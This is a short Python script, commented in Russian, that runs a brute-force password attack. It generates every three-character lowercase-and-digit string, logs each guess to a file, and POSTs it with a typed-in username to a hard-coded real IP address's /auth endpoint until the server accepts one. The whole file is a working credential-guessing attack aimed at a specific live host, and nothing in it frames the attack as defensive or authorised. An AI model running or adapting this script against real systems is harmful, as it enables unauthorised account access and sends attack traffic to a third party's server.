import itertools              #подключения используемых в программе библиотек
import string    
import time     
import requests

def breakdefence(start_range = int,end_range = int, file_name = ""): #функция создающая список неудачных попыток взлома,а также подбирает пароль для входа на хост.

    chars = string.ascii_lowercase + string.digits #список символов (маленькая латиница)+(цифры)
    attempt = 0 #переменная хранящая номер попытки
    f = open(file_name,'a') #функция открытия файла с паролями

    for password_length in range(start_range, end_range): # далее идут два цикла, первый определяет количество символов с пароле, второй определяет само ключ-слово
        for guess in itertools.product(chars,repeat=password_length): 
            attempt += 1 #счетчик кол-ва итераций
            guess = ''.join(guess) #средство записи данных в текстовый файл
            password = guess #введение дополнительной переменной определяющей ключ-слово
            f.write(guess) #предварительная запись пароля в файл с дальнейшим переходом на следующую строку
            f.write("\n")
            print(guess, attempt)   #выводит на экран пароль и номер попытки для отслеживания процесса брутфорс атаки
    

            try:                                               #дальнейший метод описывает попытку подключения к заданному хосту через заранее установленный открытый порт
                data = {'login': login, 'password': password}  #использование логина и пароля для подключения
                resp = requests.post('http://185.87.48.157:5048/auth', json = data)   #отправка запроса на хост через открытый порт
                if resp.status_code == 200: #проверка успешной авторизации на хосте
                    print("Успех! Пароль верный!:", password)
                    print("Попытка:", attempt)
                    break                                      #при успешной авторизации на хосте программа заканчивает свою работу
            except Exception as ex:                            #исключения для корректной работы метода и для уведомления пользователя о неопознанной ошибки или 
                print('Что-то пошло не так...', ex)            #прерывании подключения
    f.close()                               #закрывается файл с перебранными паролями


login = input('Введите имя пользователя: ') #введение имени пользователя для авторизации
start_range = 3                             #начальное количество символов
end_range = 4                               #конечное количество символов 
                                            #эти два значения требуются для удобного обращения с программой, а также для ограничения количества итераций
file_name = "PasswordsListToRead.txt"       #определение названия файла

start_time = time.time()                             #переменная для учета начала программы
breakdefence(start_range,end_range, file_name)       #команда вызова функции брут-форс атаки
end_time = time.time()                               #переменная для учета конца работы программы

print(end_time-start_time)                           #вывод времени работы программы

